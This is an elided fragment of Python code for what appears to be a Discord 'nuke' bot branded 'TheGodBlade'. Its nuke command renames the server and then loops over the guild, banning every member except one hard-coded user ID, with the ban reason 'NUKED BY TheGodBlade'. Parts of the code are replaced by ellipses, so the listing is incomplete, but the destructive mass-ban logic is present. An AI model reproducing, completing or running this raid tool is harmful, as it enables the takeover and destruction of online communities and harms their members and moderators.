...
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "TheGodBlade " ))#change this if you want
  print(f''' 
...
async def nuke(ctx, amount=50):
  ...
  await ctx.guild.edit(name="TheGodBlade")
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "NUKED BY TheGodBlade")
